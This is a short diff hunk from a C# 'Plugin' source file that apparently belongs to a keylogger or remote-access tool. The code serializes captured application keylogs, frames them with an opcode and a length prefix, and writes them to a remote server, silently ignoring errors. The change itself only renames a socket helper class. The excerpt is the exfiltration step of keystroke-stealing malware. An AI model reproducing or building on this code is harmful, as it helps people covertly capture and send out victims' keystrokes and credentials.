@@ -179,8 +179,8 @@ namespace Plugin
                         byte[] op = new byte[] { 4 };
                         byte[] payload = ConvertDictionaryToBytes(applicationkeylogs);
                         byte[] length = node.sock.IntToBytes(payload.Length);
-                        byte[] partial_payload = SocketHandler.Concat(length, payload);
-                        byte[] final_payload = SocketHandler.Concat(op, partial_payload);
+                        byte[] partial_payload = NetworkManager.Concat(length, payload);
+                        byte[] final_payload = NetworkManager.Concat(op, partial_payload);
                         await server.WriteAsync(final_payload, 0, final_payload.Length);
                     }
                     catch { }
